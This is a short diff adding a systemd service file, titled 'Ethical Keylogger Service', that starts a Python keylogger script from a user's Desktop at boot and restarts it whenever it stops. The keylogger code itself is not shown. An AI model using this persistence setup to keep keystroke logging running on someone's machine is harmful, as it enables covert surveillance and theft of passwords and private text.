@@ -1,0 +1,15 @@
+[Unit]
+Description=Ethical Keylogger Service
+After=graphical-session.target
+
+[Service]
+Type=simple
+ExecStart=/usr/bin/python3 /home/vision/Desktop/Keylogger/keylogger.py
+WorkingDirectory=/home/vision/Desktop/Keylogger
+Restart=always
+RestartSec=5
+User=vision
+Group=vision
+
+[Install]
+WantedBy=multi-user.target
